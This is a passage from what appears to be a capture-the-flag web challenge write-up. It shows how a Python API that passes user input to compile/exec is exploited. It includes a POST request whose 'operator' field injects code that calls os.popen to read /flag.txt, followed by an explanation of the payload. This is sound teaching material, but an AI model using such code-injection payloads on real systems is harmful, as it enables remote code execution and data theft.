&lt;p>One modyfication for testing script is required, because in this state when something is wrong application pring &lt;code>Something Went Wrong!&lt;/code> to get full traceback &lt;code>try\execpt&lt;/code> block can be removed.&lt;/p>
&lt;p>&lt;code>operator&lt;/code> variable is set to &lt;code>print(1)&lt;/code> if everything go well it should print &lt;code>1&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>current_health &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;12&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>operator &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;print(1)&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>attack_power &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;100&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>result &lt;span style="color:#f92672">=&lt;/span> {}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>code &lt;span style="color:#f92672">=&lt;/span> compile(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;result = &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>int(current_health)&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>operator&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>int(attack_power)&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;&amp;lt;string&amp;gt;&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;exec&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>exec(code, result)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(result&lt;span style="color:#f92672">.&lt;/span>get(&lt;span style="color:#e6db74">&amp;#39;result&amp;#39;&lt;/span>))
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>After executing script returns &lt;code>SyntaxError: Invalid Syntax&lt;/code> and result is equal to &lt;code>result = 12 print(1) 100&lt;/code> so 12 is &lt;code>current_health&lt;/code> and 100 is &lt;code>attack_power&lt;/code>&lt;/p>
&lt;p>&lt;img src="images/Untitled%203.png" alt="Untitled">&lt;/p>
&lt;p>Python can be run &lt;code>inline&lt;/code> and next instruction are separated with semicolon &lt;code>;&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>current_health &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;12&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>operator &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;;print(1);&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>attack_power &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;100&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>result &lt;span style="color:#f92672">=&lt;/span> {}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>code &lt;span style="color:#f92672">=&lt;/span> compile(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;result = &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>int(current_health)&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>operator&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>int(attack_power)&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;&amp;lt;string&amp;gt;&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;exec&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>exec(code, result)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(result&lt;span style="color:#f92672">.&lt;/span>get(&lt;span style="color:#e6db74">&amp;#39;result&amp;#39;&lt;/span>))
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Executing this version yield expected results, script prints additional &lt;code>1&lt;/code> in terminal window.&lt;/p>
&lt;p>&lt;img src="images/Untitled%204.png" alt="Untitled">&lt;/p>
&lt;h1 id="exploitation">Exploitation&lt;/h1>
&lt;p>With &lt;code>Remote Code Execution&lt;/code> now we can read the flag.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>POST &lt;span style="color:#f92672">/&lt;/span>api&lt;span style="color:#f92672">/&lt;/span>get_health HTTP&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host: &lt;span style="color:#ae81ff">127.0.0.1&lt;/span>:&lt;span style="color:#ae81ff">1337&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User&lt;span style="color:#f92672">-&lt;/span>Agent: Mozilla&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">5.0&lt;/span> (X11; Linux x86_64; rv:&lt;span style="color:#ae81ff">102.0&lt;/span>) Gecko&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">20100101&lt;/span> Firefox&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">102.0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept: &lt;span style="color:#f92672">*/*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept&lt;span style="color:#f92672">-&lt;/span>Language: en&lt;span style="color:#f92672">-&lt;/span>US,en;q&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0.5&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept&lt;span style="color:#f92672">-&lt;/span>Encoding: gzip, deflate
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Referer: http:&lt;span style="color:#f92672">//&lt;/span>&lt;span style="color:#ae81ff">127.0.0.1&lt;/span>:&lt;span style="color:#ae81ff">1337&lt;/span>&lt;span style="color:#f92672">/&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content&lt;span style="color:#f92672">-&lt;/span>Type: application&lt;span style="color:#f92672">/&lt;/span>json
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Origin: http:&lt;span style="color:#f92672">//&lt;/span>&lt;span style="color:#ae81ff">127.0.0.1&lt;/span>:&lt;span style="color:#ae81ff">1337&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content&lt;span style="color:#f92672">-&lt;/span>Length: &lt;span style="color:#ae81ff">114&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Connection: close
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Sec&lt;span style="color:#f92672">-&lt;/span>Fetch&lt;span style="color:#f92672">-&lt;/span>Dest: empty
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Sec&lt;span style="color:#f92672">-&lt;/span>Fetch&lt;span style="color:#f92672">-&lt;/span>Mode: cors
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Sec&lt;span style="color:#f92672">-&lt;/span>Fetch&lt;span style="color:#f92672">-&lt;/span>Site: same&lt;span style="color:#f92672">-&lt;/span>origin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;current_health&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;43&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;attack_power&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;33&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;operator&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;;result = __import__(&amp;#39;os&amp;#39;).popen(&amp;#39;cat /flag.txt&amp;#39;).read();&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>After sending this malicious request to the server application returns with flag.&lt;/p>
&lt;p>&lt;img src="images/Untitled%205.png" alt="Untitled">&lt;/p>
&lt;h2 id="payload-explanation">Payload explanation&lt;/h2>
&lt;pre tabindex="0">&lt;code>&amp;#34;operator&amp;#34;:&amp;#34;;result = __import__(&amp;#39;os&amp;#39;).popen(&amp;#39;cat /flag.txt&amp;#39;).read();&amp;#34;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>semicolons are here for valid python code exectution - without &lt;code>;&lt;/code> signs interpreter throws &lt;code>invalid syntax&lt;/code> error&lt;/li>
&lt;li>&lt;code>result =&lt;/code> this overwrites variable that is returned in response to the user&lt;/li>
&lt;li>&lt;code>__import__&lt;/code> is function called by regular &lt;code>import&lt;/code> statement this allows to import modules directly so &lt;code>__import__('os')&lt;/code> means the same as &lt;code>import os&lt;/code> but can be done inline and can call function directly by referencing them as “objects”&lt;/li>
&lt;li>&lt;code>popen('cat /flag.txt')&lt;/code> this function spawns shell process and executes command &lt;code>cat /flag.txt&lt;/code>&lt;/li>
&lt;li>&lt;code>read()&lt;/code> reads output of a process from &lt;code>popen&lt;/code>&lt;/li>
&lt;/ul></content></item></channel></rss>